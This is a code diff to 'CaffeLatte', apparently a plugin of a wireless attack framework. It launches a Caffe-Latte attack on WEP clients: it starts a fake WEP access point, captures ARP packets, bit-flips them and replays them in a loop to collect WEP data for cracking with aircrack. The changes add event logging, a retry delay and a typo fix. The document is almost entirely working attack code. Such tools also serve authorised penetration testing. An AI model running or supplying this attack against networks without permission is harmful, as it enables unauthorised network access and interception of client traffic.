@@ -1,17 +1,19 @@
 # -*- coding: utf-8 -*-
 """
-This plugin will launch a full arp replay attack on a WEP network
+This plugin will launch a full arp replay attack on a WEP network.
+
 You can then check the wep data log and launch aircrack on it.
 """
 from AuxiliaryModules.packet import ClientPacket
 from AuxiliaryModules.minwepap import MinimalWEP
 from AuxiliaryModules.tcpdumplogger import TCPDumpLogger
+from AuxiliaryModules.events import SuccessfulEvent, UnsuccessfulEvent, NeutralEvent
+from SessionManager.sessionmanager import SessionManager
 from plugin import AirScannerPlugin, AirInjectorPlugin
 from random import randint
-from scapy.all import sniff, Dot11, Dot11WEP, conf
-from subprocess import Popen
+from scapy.all import Dot11, Dot11WEP, conf
 from struct import pack
-from time import strftime
+from time import strftime, sleep
 from threading import Thread
 from utils.crc import calc_crc32
 
@@ -88,7 +90,6 @@ class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):
 
     def replay_attack(self):
         socket = conf.L2socket(iface = self.sniffing_interface)
-        flipped_packets = []
 
         print "[+] Starting replay attack"
         while self.replay_attack_running:
@@ -97,14 +98,21 @@ class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):
                 for p in self.flipped_arp_packets:
                     socket.send(p)
                     self.n_arp_packets_sent += 1
-            except: pass  # No buffer space available.. skip and keep sending
+            except:
+                # No buffer space available.. wait and keep sending
+                sleep(.25)
 
         print "[+] Stopped replay attack from last ARP packet"
         socket.close()
+        SessionManager().log_event(NeutralEvent("Stopped Caffe-Latte attack. Logged {} WEP Data packets."
+                                                .format(self.tcpdump_logger.get_wep_data_count())))
 
     def pre_scanning(self):
         # Start WEP access point
         self.wep_ap.start()
+        SessionManager().log_event(NeutralEvent(
+                                  "Starting Minimalistic WEP AP with ssid '{}' to perform Caffe-Latte attack."
+                                  .format(self.ap_ssid)))
 
     def prepare_logger(self, client_mac):
         # Prepare Log file
@@ -120,7 +128,7 @@ class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):
         del self.flipped_arp_packets[:]
         for p in self.original_arp_packets:
             for i in range(5):
-                self.flipped_arp_packets.append(self.flip_bits(p))  # Randomness is invlolved so it is not a duplicate packet.
+                self.flipped_arp_packets.append(self.flip_bits(p))  # Randomness is involved so it is not a duplicate packet.
 
     def handle_packet(self, packet):
         if not self.replay_attack_running:
@@ -138,6 +146,9 @@ class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):
                     print "[+] Flipping and adding to the flipped packets ring."
                     self.original_arp_packets.append(packet)
                     self.flip_original_arp_packets()
+                    SessionManager().log_event(SuccessfulEvent(
+                                              "Found ARP Packet from '{}' to perform Caffe-Latte attack."
+                                              .format(self.target_client_mac)))
 
                 if not self.replay_attack_running:
                     self.prepare_logger(client_mac)
